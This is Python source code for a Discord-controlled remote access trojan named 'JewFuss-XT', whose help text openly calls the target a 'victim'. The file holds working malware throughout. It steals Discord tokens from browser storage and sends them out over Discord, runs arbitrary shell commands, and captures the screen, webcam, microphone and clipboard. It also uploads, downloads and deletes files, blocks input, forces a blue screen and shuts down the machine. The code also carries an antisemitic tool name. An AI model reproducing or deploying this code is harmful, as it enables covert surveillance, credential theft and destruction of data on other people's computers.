from PIL import ImageGrab, ImageDraw
from discord.ext import commands
from threading import Thread
from pynput import keyboard
import subprocess
import webbrowser
import pyautogui
import pyperclip
import datetime
import platform
import requests
import tempfile
import asyncio
import discord
import hashlib
import pyaudio
import tarfile
import ctypes
import psutil
import shutil
import winreg
import time
import uuid
import wave
import cv2
import sys
import wmi
import io
import os
import re

TOKEN = "Bot token here" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h

FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='$', intents=intents)
bot.remove_command('help')
pyautogui.FAILSAFE = False

def sanitize_channel_name(name):
    sanitized = re.sub(r'[^a-zA-Z0-9_-]', '', name).lower()
    return sanitized

def bot_channel():
    raw_channel_name = f"{os.environ.get('COMPUTERNAME', 'UnknownDevice')}-{os.getlogin()}"
    channel_name = sanitize_channel_name(raw_channel_name)
    return channel_name

def force_home_directory():
    home_dir = os.path.expanduser("~")
    return home_dir

def check_permissions(file_path):
    permissions = {
        'read': os.access(file_path, os.R_OK),
        'write': os.access(file_path, os.W_OK),
        'execute': os.access(file_path, os.X_OK),
        'delete': os.access(file_path, os.W_OK)
    }
    return permissions

async def send_permission_status(ctx, file_path):
    permissions = check_permissions(file_path)
    if not all(permissions.values()):
        await ctx.send(f"This program does not have access to modifying {file_path}. Permissions for the file are as set:")
        perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
        await ctx.send(f"```{perms_message}```")

# -------------------
#       PYMACRO
# -------------------

variables = {}

def f_wait_for_keys_internal(key_combo, ctxchannel):
    key_combo = key_combo.lower().split()
    keys_pressed = set()

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char:
                keys_pressed.add(key.char.lower())
            elif hasattr(key, 'name') and key.name:
                keys_pressed.add(key.name.lower())
            
            if all(k in keys_pressed for k in key_combo):
                return False
        except Exception as e:
            asyncio.run(ctxchannel.send(f"Error in key listener: {e}"))

    def on_release(key):
        try:
            if hasattr(key, 'char') and key.char:
                keys_pressed.discard(key.char.lower())
            elif hasattr(key, 'name') and key.name:
                keys_pressed.discard(key.name.lower())
        except Exception as e:
            asyncio.run(ctxchannel.send(f"Error in key listener: {e}"))

    asyncio.run(ctxchannel.send(f"Waiting for keys: {' '.join(key_combo)}"))
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def f_evaluate_expression_internal(expression):
    try:
        resolved_expression = f_resolve_expression_internal(expression)
        return eval(resolved_expression, {"__builtins__": None}, {})
    except Exception as e:
        raise ValueError(f"Error evaluating expression: {expression}. Error: {str(e)}")

def f_parse_wrapped_string_internal(arg):
    if arg.startswith('"') and arg.endswith('"'):
        return re.sub(r'\\(["\'])', r'\1', arg[1:-1])
    elif arg.startswith("'") and arg.endswith("'"):
        return re.sub(r'\\(["\'])', r'\1', arg[1:-1])
    return arg

def f_resolve_expression_internal(expression):
    try:
        expression = re.sub(
            r"\!\$\{\%clip\%\}",
            lambda m: pyperclip.paste(),
            expression
        )

        expression = re.sub(
            r"\$\{([^}]+)\}",
            lambda m: str(variables.get(m.group(1), "")),
            expression
        )

        expression = re.sub(
            r"\$\{~([^}]+)~\}",
            lambda m: str(os.getenv(m.group(1), "")),
            expression
        )

        expression = re.sub(
            r"\$\{\+([^}]+)\+\}",
            lambda m: str(os.getenv(m.group(1), "")),
            expression
        )

        return expression
    except Exception as e:
        raise ValueError(f"Error resolving expression: {expression}. Error: {str(e)}")

def f_set_variable_internal(var, value):
    if var.startswith("~") and var.endswith("~"):
        os.environ[var[1:-1]] = value
    elif var.startswith("+") and var.endswith("+"):
        os.system(f"setx {var[1:-1]} {value}")
    else:
        variables[var] = value

async def f_parse_internal(command, ctx):
    try:
        parts = command.strip().split()
        if not parts:
            return

        cmd = parts[0].lower()

        def resolve_args(args):
            return [f_resolve_expression_internal(f_parse_wrapped_string_internal(arg)) for arg in args]

        if cmd == "cursor":
            x = int(f_evaluate_expression_internal(parts[1]))
            y = int(f_evaluate_expression_internal(parts[2]))
            pyautogui.moveTo(x, y)

        elif cmd == "key":
            key = f_resolve_expression_internal(parts[1].lower())
            action = parts[2].lower() if len(parts) > 2 else "press"
            if action == "down":
                pyautogui.keyDown(key)
            elif action == "up":
                pyautogui.keyUp(key)
            elif action == "press":
                pyautogui.press(key)

        elif cmd == "hotkey":
            combo = resolve_args(parts[1:])
            pyautogui.hotkey(*combo)

        elif cmd == "wait":
            if len(parts) > 2 and parts[-1].lower() in {"ms", "s", "sec", "seconds", "milliseconds"}:
                duration_expr = " ".join(parts[1:-1])
                unit = parts[-1].lower()
            else:
                duration_expr = " ".join(parts[1:])
                unit = "ms"

            duration = float(f_evaluate_expression_internal(duration_expr))

            if unit.startswith("ms"):
                await asyncio.sleep(duration / 1000)
            elif unit.startswith("s"):
                await asyncio.sleep(duration)

        elif cmd == "write":
            text = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[1:])))
            pyautogui.write(text)

        elif cmd == "mb":
            button_map = {1: "left", 2: "right", 3: "middle", 4: "x1", 5: "x2"}
            button = button_map.get(int(f_resolve_expression_internal(parts[1])), "left")
            action = parts[2].lower() if len(parts) > 2 else "press"
            if action == "down":
                pyautogui.mouseDown(button=button)
            elif action == "up":
                pyautogui.mouseUp(button=button)
            elif action == "press":
                pyautogui.click(button=button)

        elif cmd == "scroll":
            amount = int(f_evaluate_expression_internal(parts[1]))
            pyautogui.scroll(amount)

        elif cmd == "clip":
            subcmd = parts[1].lower()
            if subcmd == "copy":
                text = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[2:])))
                pyperclip.copy(text)
            elif subcmd == "paste":
                pyautogui.write(pyperclip.paste())
            elif subcmd == "clear":
                pyperclip.copy("")
            else:
                raise ValueError(f"Invalid clip action: {subcmd}")

        elif cmd == "set":
            var = parts[1]
            value = f_resolve_expression_internal(" ".join(parts[2:]))
            f_set_variable_internal(var, f_parse_wrapped_string_internal(value))

        elif cmd == "del":
            var = parts[1]
            if var.startswith("~") and var.endswith("~"):
                os.environ.pop(var[1:-1], None)
            elif var.startswith("+") and var.endswith("+"):
                os.system(f"setx {var[1:-1]} ''")
            else:
                variables.pop(var, None)

        elif cmd == "continue":
            keys = resolve_args(parts[1:])
            f_wait_for_keys_internal(" ".join(keys), ctx)

        elif cmd == "log":
            message = f_resolve_expression_internal(f_parse_wrapped_string_internal(" ".join(parts[1:])))
            await ctx.send(message)

    except Exception as e:
        await ctx.send(f"Error processing command: {command}")
        await ctx.send(f"Exception: {e}")

def f_parse_config_options_internal(script):
    config = {
        "DisableAdminVarWarning": False,
        "FuncSplit": ";",
        "CommentOverride": None,
    }
    new_script_lines = []

    for line in script.splitlines():
        line = line.strip()
        if line.startswith("@"):
            if line.lower() == "@disableadminvarwarning":
                config["DisableAdminVarWarning"] = True
            elif line.lower().startswith("@funcsplit ="):
                split_char = line.split("=", 1)[1].strip().strip('"')
                config["FuncSplit"] = split_char
            elif line.lower().startswith("@commentoverride ="):
                comment_char = line.split("=", 1)[1].strip().strip('"')
                config["CommentOverride"] = None if comment_char.lower() == "none" else comment_char
        else:
            new_script_lines.append(line)

    return config, "\n".join(new_script_lines)

async def i_macro(execstr, ctx, echo_errors=True):
    try:
        if execstr is None:
            ctx.send("Input cannot be None")
            return

        config, cleaned_script = f_parse_config_options_internal(execstr)

        if not config["DisableAdminVarWarning"]:
            sys_var_pattern = r"set\s+\+([^\+]+)\+\s+"
            matches = re.findall(sys_var_pattern, execstr)
            if matches:
                ctx.send("WARNING: This script modifies system environment variables.")
                ctx.send("         These changes will only work if the program is run as administrator.")
                ctx.send(f"         Detected system variables: {', '.join(matches)}\n\n")

        commands = (
            cleaned_script.split(config["FuncSplit"])
            if config["FuncSplit"] != "\\n"
            else [line for line in cleaned_script.splitlines() if line.strip()]
        )

        for command in commands:
            if config["CommentOverride"] and config["CommentOverride"] in command:
                command = command.split(config["CommentOverride"], 1)[0].strip()

            if not command:
                continue

            await f_parse_internal(command.strip(), ctx)

    except Exception as e:
        if echo_errors:
            ctx.send(f"Error running macro:")
            ctx.send(f"Exception: {e}")

@bot.command(help="A modified version of PyMacro to work as a discord bot, docs at https://github.com/gabrielzv1233/PyMacro/blob/main/readme.md")
async def macro(ctx, *, command: str = None):
    if ctx.message.attachments:
        if len(ctx.message.attachments) > 1:
            await ctx.send("Please attach only one .pymacro file at a time.")
            return
        
        attachment = ctx.message.attachments[0]
        if attachment.filename.lower().endswith(".pymacro"):
            file_bytes = await attachment.read()
            script_content = file_bytes.decode("utf-8")
            await i_macro(script_content, ctx)
            return
        
    elif command != None:
        await i_macro(command, ctx)
        return
        
    await ctx.send("No .pymacro file attached!")

@bot.command(help="Runs a command using subprocesses")
async def cmd(ctx, *, command: str):
    try:
        result = subprocess.run(f'cmd /c "{command}"', shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout.strip() or result.stderr.strip() or "No output"
        await ctx.send(f"## Output:\n{output}")
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(name='checkperms', help="Checks if the program has access to provided file path")
async def checkperms(ctx, file_path: str):
    permissions = check_permissions(file_path)
    perms_message = '\n'.join([f'{perm}: {value}' for perm, value in permissions.items()])
    await ctx.send(f"Permissions for {file_path} are as follows:\n```{perms_message}```")

@bot.command(help="Delete and recreates bots channel, wiping all the messages")
async def init(ctx):
    user = ctx.author

    if user.guild_permissions.administrator:
        channel_name = bot_channel()
        existing_channel = discord.utils.get(ctx.guild.text_channels, name=channel_name)

        if ctx.message.content.endswith("/f"):
            if existing_channel is not None:
                await existing_channel.delete()
            overwrites = {
                ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            new_channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
            await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
        else:
            if existing_channel is None:
                overwrites = {
                    ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    ctx.guild.me: discord.PermissionOverwrite(read_messages=True)
                }
                new_channel = await ctx.guild.create_text_channel(channel_name, overwrites=overwrites)
                await new_channel.send(f"Channel wiped by {ctx.author.mention}.")
            else:
                await ctx.send("Channel already exists, please run `$init /f` to wipe the channel (delete and recreate).")
    else:
        await ctx.send("You don't have permission to initialize configuration for this guild.")

@bot.event
async def on_guild_join(guild):
    channel_name = bot_channel()
    existing_channel = discord.utils.get(guild.text_channels, name=channel_name)

    if existing_channel is None:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }
        new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
        await new_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")
    else:
        await existing_channel.send(f"Bot has joined! Please run `$init` in this channel to get started.")

@bot.event
async def on_ready():
    in_server_ammount = 0
    for guild in bot.guilds:
        channel_name = bot_channel()
        existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
        logon_date = datetime.datetime.now().strftime("Latest logon: %m/%d/%Y %H:%M:%S")

        if existing_channel is None:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            new_channel = await guild.create_text_channel(channel_name, overwrites=overwrites)
            await new_channel.edit(topic=logon_date)
            await new_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands.")
        else:
            await existing_channel.edit(topic=logon_date)
            await existing_channel.send(f"`{os.getlogin()}` has logged on! Use this channel for further commands.")
        in_server_ammount += 1
            
    print(f'JewFuss-XT logged in as "{bot.user.name}" on {in_server_ammount} server(s)')

@bot.event
async def on_message(message):
    if message.author.bot:
        return
    channel_name = bot_channel()
    if message.channel.name == channel_name:
        await bot.process_commands(message)
        
@bot.command()
async def sysinfo(ctx):
    windows_devicename = platform.node()
    windows_version = platform.version()
    windows_os_build = platform.win32_ver()[1]
    windows_os_type = platform.win32_ver()[0]
    timezone = time.tzname[0] if time.daylight != 0 else time.tzname[1]
    
    try:
        c = wmi.WMI()
        system = c.Win32_ComputerSystem()[0]
        bios = c.Win32_BIOS()[0]
        processor = c.Win32_Processor()[0]
        network_adapters = c.Win32_NetworkAdapterConfiguration(IPEnabled=True)
        physical_disk = c.Win32_DiskDrive()[0]
        
        serial_number = bios.SerialNumber if hasattr(bios, 'SerialNumber') else "Unknown"
        manufacturer = system.Manufacturer if hasattr(system, 'Manufacturer') else "Unknown"
        model = system.Model if hasattr(system, 'Model') else "Unknown"
        total_ram = int(system.TotalPhysicalMemory) // (1024**2) if hasattr(system, 'TotalPhysicalMemory') else "Unknown"
        total_ram_gb = total_ram / 1024 if total_ram != "Unknown" else "Unknown"
        cpu = processor.Name if hasattr(processor, 'Name') else "Unknown"
        total_main_drive_storage = int(physical_disk.Size) // (1024**3) if hasattr(physical_disk, 'Size') else "Unknown"
        network_adapter = network_adapters[0].Description.split(" - ")[-1] if network_adapters else "Unknown"
        
        uuid_process = subprocess.run(['wmic', 'csproduct', 'get', 'uuid'], capture_output=True, text=True)
        device_uuid = uuid_process.stdout.strip().split('\n')[-1]
        if device_uuid.startswith("UUID"):
            device_uuid = device_uuid.replace("UUID", "").strip()
        
        sku_number = system.IdentifyingNumber if hasattr(system, 'IdentifyingNumber') else "Unknown"
        ip = requests.get('https://api.ipify.org').content.decode('utf8')
    
    except Exception as e:
        await ctx.send(f"Error fetching system information: {e}")
        return
    
    output = "```\n"
    output += f"Windows Information:\n"
    output += f"Windows devicename: {windows_devicename}\n"
    output += f"Windows Version: {windows_version}\n"
    output += f"Windows OS Build: {windows_os_build}\n"
    output += f"Windows OS Type: {windows_os_type}\n"
    output += f"\nOther Information:\n"
    output += f"Public IP: {format(ip)}\n"
    output += f"Timezone: {timezone}\n"
    output += f"\nDevice Specifications:\n"
    output += f"Serial Number: {serial_number}\n"
    output += f"Manufacturer: {manufacturer}\n"
    output += f"Model: {model}\n"
    output += f"Total RAM: {total_ram_gb:.2f} GB ({total_ram} MB)\n"
    output += f"CPU: {cpu}\n"
    output += f"Total Main Drive Storage: {total_main_drive_storage} GB\n"
    output += f"Network adapter: {network_adapter}\n"
    output += f"Device UUID: {device_uuid}\n"
    output += f"SKU Number: {sku_number}\n"
    output += "```"
    
    if len(output) > 2000:
        with tempfile.NamedTemporaryFile(mode='w', delete=False, encoding='utf-8') as temp_file:
            temp_file.write(output)
            temp_file_name = temp_file.name
        
        await ctx.send(file=discord.File(temp_file_name))
    else:
        await ctx.send(output)

@bot.command(help="Discord-Token-Grabber by TomekLisek on replit modified as a discord command")
async def getdiscord(ctx):
    try:
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
        message = '​\n'
        for platform, path in paths.items():
            try:
                if not os.path.exists(path):
                    continue
                message += f'**{platform}**```'
                path += '\\Local Storage\\leveldb'
                tokens = []
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in re.findall(regex, line):
                                tokens.append(token)
                if len(tokens) > 0:
                    for token in tokens:
                        message += f'{token}'
                else:
                    message += 'No tokens found.'
            except Exception as e:
                message += f'**Somthing went wrong**```{e}```'
        try:
            await ctx.send(message)
        except:
            pass
    except Exception as e:
        await ctx.send(f"Error executing getdiscord: {str(e)}")
    
@bot.command(help="Move cursor to defined x and y pixel coordinates on victim's device.")
async def setpos(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await ctx.send("Cursor position set successfully.")
    except Exception as e:
        await ctx.send(f"Error setting cursor position: {str(e)}")

@bot.command(help="Simulate left mouse click on victim's device.")
async def lclick(ctx):
    try:
        pyautogui.click(button='left')
        await ctx.send("Left click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing left click: {str(e)}")

@bot.command(help="Simulate middle mouse click on victim's device.")
async def mclick(ctx):
    try:
        pyautogui.click(button='middle')
        await ctx.send("Middle click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing middle click: {str(e)}")

@bot.command(help="Simulate right mouse click on victim's device.")
async def rclick(ctx):
    try:
        pyautogui.click(button='right')
        await ctx.send("Right click executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing right click: {str(e)}")

@bot.command(help="Press a key/hotkey on victim's device.\nAvailable functions: press, down, up, hotkey (format button+button). Available keys: https://bit.ly/3ya6vKg")
async def key(ctx, func: str = "", value: str = ""):
    if not func:
        await ctx.send("Function not provided. Available functions: press, down, up, hotkey.")
        return

    func = func.lower()
    
    if func not in ["press", "down", "up", "hotkey"]:
        await ctx.send("Invalid function. Available functions: press, down, up, hotkey.")
        return

    if not value or value == "":
        await ctx.send("Key not provided. Available keys: https://bit.ly/3ya6vKg.")
        return
    
    try:
        if func == "press":
            pyautogui.press(value)
        elif func == "down":
            pyautogui.keyDown(value)
        elif func == "up":
            pyautogui.keyUp(value)
        elif func == "hotkey":
            keys = value.split("+")
            pyautogui.hotkey(*keys)
        
        await ctx.send("Command executed successfully.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")


@bot.command(help="Get victims clipboard.")
async def get_clipboard(ctx):
    try:
        await ctx.send(f"Current clipboard: ```{pyperclip.paste()}```")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Copy given text to victims clipboard.")
async def set_clipboard(ctx, *, text: str):
    try:
        pyperclip.copy(text)
        await ctx.send(f"Copied to clipboard")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")   

@bot.command(help="Takes a screenshot of the victim's screen including cursor location.")
async def ss(ctx):
    img = ImageGrab.grab()
    cursor_position = pyautogui.position()

    draw = ImageDraw.Draw(img)
    draw.ellipse((cursor_position[0]//2-5, cursor_position[1]//2-5, cursor_position[0]//2+5, cursor_position[1]//2+5), fill=(255, 0, 0))

    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
        img.save(temp_file, 'PNG')
        await ctx.send("Command Executed! (Red dot indicates cursor)", file=discord.File(temp_file.name, filename="screenshot.png"))
        
@bot.command(name="tts", help="Run TTS on victim's system")
async def tts(ctx, *, text: str):
    global tts_process
    try:
        if tts_process is not None:
            tts_process.kill()
        await ctx.send("Command Executed!")
        tts_process = subprocess.Popen(
            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
tts_process = None

@bot.command(name="ttsurl", help="Run TTS on victim's system!")
async def ttsurl(ctx, url: str):
    global tts_process
    try:
        if tts_process is not None:
            tts_process.kill()
        await ctx.send("Command Executed!")

        response = requests.get(url)
        text = response.text

        # Run the TTS process in a subprocess
        tts_process = subprocess.Popen(
            ["python", "-c", f"import sys; from pyttsx3 import init as tts_init; engine = tts_init(); engine.say({repr(text)}); engine.runAndWait()"],
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        await ctx.send("TTS process started! Use !stoptts to stop it.")
        
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command(name="stoptts", help="Stops TTS")
async def stoptts(ctx):
    global tts_process
    if tts_process is not None:
        try:
            await ctx.send("TTS process stopped.")
            tts_process.kill()
            tts_process = None
        except Exception as e:
            await ctx.send(f"Error stopping TTS process: {str(e)}")
    else:
        await ctx.send("No TTS process running.")

@bot.command(help="Records audio from the victim's microphone for 10 seconds.")
async def listen(ctx):
    def recording_thread():
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 10

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        with io.BytesIO() as buf:
            wf = wave.open(buf, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            buf.seek(0)
            bot.loop.call_soon_threadsafe(asyncio.create_task, send_response(ctx, buf))

    def send_response(ctx, buf):
        return ctx.send("Command Executed!", file=discord.File(fp=buf, filename="output.wav"))

    thread = Thread(target=recording_thread)
    thread.start()

@bot.command(help="Types the given text on the victim's system.")
async def write(ctx, *, text: str):
    try:
        pyautogui.write(text)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")
        
@bot.command(help="Upload a file to a specific path on victim's system")
async def upload(ctx, folder: str = None):
    if not folder:
        await ctx.send("Error: No folder path provided. Please specify a folder to upload the file to.")
        return
    if not os.path.exists(folder):
        os.makedirs(folder)
    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(folder, attachment.filename)
        await attachment.save(file_path)
        await ctx.send(f"File `{attachment.filename}` has been saved to '{folder}'.")
    else:
        await ctx.send("Error: No file attached to the message.")

@bot.command(help="Lists contents of a folder on victim's system, format $ls {folder (D:/folder/)}")
async def ls(ctx, path: str = None):
    try:
        if not path:
            await ctx.send("Error: No path provided. Please specify a directory path to list.")
            return
        if not os.path.exists(path):
            await ctx.send(f"Error: The path '{path}' does not exist.")
            return
        if not os.path.isdir(path):
            await ctx.send(f"Error: The path '{path}' is not a directory.")
            return
        items = os.listdir(path)
        parent_dir = os.path.abspath(os.path.join(path, os.pardir))
        dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
        files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
        response = f"Parent Directory: {parent_dir}\n\n"
        if dirs or files:
            for directory in dirs:
                dir_full_path = os.path.join(path, directory)
                response += f"[DIR]  {dir_full_path}\n"
            for file in files:
                file_full_path = os.path.join(path, file)
                response += f"[FILE] {file_full_path}\n"
        else:
            response += "This directory is empty.\n"

        if len(response) > 2000:
            file_path = "directory_listing.txt"
            with open(file_path, "w") as file:
                file.write(response)
            await ctx.send(file=discord.File(file_path))
            os.remove(file_path)
        else:
            await ctx.send(response)
    except Exception as e:
        await ctx.send(f"Error: Could not list the directory contents. {str(e)}")


@bot.command(help="Runs a specified program on victim's system, format $run {file (D:/file.exe)}")
async def run(ctx, file_path: str = None):
    if not file_path:
        await ctx.send("Error: No file path provided. Please specify the file path to run.")
        return
    if not os.path.exists(file_path):
        await ctx.send(f"Error: The file '{file_path}' does not exist.")
        return
    try:
        subprocess.Popen(file_path, shell=True)
        await ctx.send(f"File '{file_path}' has been executed.")
    except Exception as e:
        await ctx.send(f"Error: Could not execute the file. {str(e)}")    

@bot.command(help="Compresses and downloads a file or folder from victim's system, format $download {file_or_folder_path (D:/file_or_folder)} (attached file is downloaded)")
async def download(ctx, file_path: str = None):
    if not file_path:
        await ctx.send("Error: No file path provided. Please specify the file or folder path to download.")
        return
    if not os.path.exists(file_path):
        await ctx.send(f"Error: The path '{file_path}' does not exist.")
        return
    
    try:
        tar_filename = os.path.basename(file_path) + '.tar.gz'
        tar_path = os.path.join(os.path.dirname(file_path), tar_filename)
        
        with tarfile.open(tar_path, "w:gz") as tar:
            if os.path.isfile(file_path):
                tar.add(file_path, arcname=os.path.basename(file_path))
            elif os.path.isdir(file_path):
                tar.add(file_path, arcname=os.path.basename(file_path))
            else:
                await ctx.send(f"Error: The path '{file_path}' is neither a file nor a folder.")
                return
        
        await ctx.send(file=discord.File(tar_path))
        os.remove(tar_path)
        
    except Exception as e:
        await ctx.send(f"Error: Could not compress and send the file or folder. {str(e)}")
    
@bot.command(help="Deletes a folder or file from the victim's system, format $delete {file (D:/file.png)}")
async def delete(ctx, path: str = None):
    if not path:
        await ctx.send("Error: No path provided. Please specify a file or folder path to delete.")
        return
    if os.path.isfile(path):
        os.remove(path)
        await ctx.send(f"File '{path}' has been deleted.")
    elif os.path.isdir(path):
        shutil.rmtree(path)
        await ctx.send(f"Folder '{path}' and all its contents have been deleted.")
    else:
        await ctx.send(f"The path '{path}' does not exist.")
        
@bot.command(help="Moves a file from one location to another on victim's system, format $move {file (D:/file.png)} {folder (D:/destination/)}")
async def move(ctx, source: str = None, destination: str = None):
    if not source or not destination:
        await ctx.send("Error: Please provide both source and destination paths.")
        return
    if not os.path.exists(source):
        await ctx.send(f"Error: The source path '{source}' does not exist.")
        return
    destination_dir = os.path.dirname(destination)
    if not os.path.exists(destination_dir):
        await ctx.send(f"Error: The destination directory '{destination_dir}' does not exist.")
        return
    try:
        shutil.move(source, destination)
        await ctx.send(f"'{source}' has been moved to '{destination}'.")
    except Exception as e:
        await ctx.send(f"Error: Could not move '{source}' to '{destination}'. {str(e)}")

@bot.command(help="Freezes the cursor on the victim's system.")
async def freezecursor(ctx):
    try:
        result = ctypes.windll.user32.BlockInput(True)
        if result == 0:
            await ctx.send("Failed to freeze cursor. Victim is not running with elevated privileges.")
        else:
            await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Unfreezes the cursor on the victim's system.")
async def unfreezecursor(ctx):
    try:
        ctypes.windll.user32.BlockInput(False)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Attempts to trigger a blue screen on the victim's system.")
async def bluescreen(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Takes a picture on the victim's webcam.")
async def webcampic(ctx, cam: int = 0):
    try:
        cap = cv2.VideoCapture(cam)
        if not cap.isOpened():
            raise Exception("Could not open webcam")
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            raise Exception("Failed to grab frame from webcam")
        
        with io.BytesIO() as buf:
            im_encoded = cv2.imencode(".png", frame)[1]
            buf.write(im_encoded.tobytes())
            buf.seek(0)
            await ctx.send(f"Captured from camera {cam}!", file=discord.File(fp=buf, filename="webcam.png"))
            
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Lists all running tasks on the victim's system.")
async def tasks(ctx):
    processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
    
    with io.StringIO() as buf:
        for proc in processes:
            buf.write(f"PID: {proc['pid']} - Name: {proc['name']}\n")
        
        buf.seek(0)
        
        await ctx.send("List of running tasks:", file=discord.File(fp=buf, filename="tasks.txt"))

@bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.")
async def kill(ctx, arg: str = ""):
    if arg == "" or not arg:
        await ctx.send("Please enter a task to be terminated")
    try:
        pid = int(arg)
        process = psutil.Process(pid)
        process.terminate() 
        await ctx.send(f"Task with PID {pid} has been terminated!")
    except ValueError:
        terminated = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == arg:
                try:
                    psutil.Process(proc.info['pid']).terminate()
                    terminated += 1
                except psutil.NoSuchProcess:
                    pass
        if terminated > 0:
            await ctx.send(f"Terminated {terminated} processes with the name {arg}.")
        else:
            await ctx.send(f"No processes with the name {arg} found.")
    except Exception as e:
        await ctx.send(f"Error terminating task: {str(e)}")

@bot.command(help="Opens the given website on the victim's default browser and maximizes it.")
async def website(ctx, *, url: str):
    try:
        webbrowser.open(url)
        time.sleep(3)
        pyautogui.hotkey('f11')
        
        await ctx.send(f"Opened and maximized the website: {url}")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Shuts down the victim's system.")
async def shutdown(ctx):
    try:
        os.system('shutdown /s /t 1')
        await ctx.send("Command Executed! System is shutting down.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Restarts the victim's system.")
async def restart(ctx):
    try:
        os.system('shutdown /r /t 1')
        await ctx.send("Command Executed! System is restarting.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Logs off the current user on the victim's system.")
async def logoff(ctx):
    try:
        os.system('shutdown /l')
        await ctx.send("Command Executed! Logging off.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command()
async def help(ctx, command_name: str):
    command = bot.get_command(command_name)
    if command:
        embed = discord.Embed(
            title=f"Help: {command_name}",
            description=command.help if command.help else "No description provided",
            color=0x007BFF
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"Command '{command_name}' not found.")

per_page = 10

@bot.command()
async def commands(ctx, page: int = 1):
    commands_list = list(bot.commands)

    max_page = (len(commands_list) - 1) // per_page + 1

    if page < 1 or page > max_page:
        await ctx.send(f"Page {page} is out of range. Please provide a page number between 1 and {max_page}.")
        return

    start_index = (page - 1) * per_page
    end_index = start_index + per_page
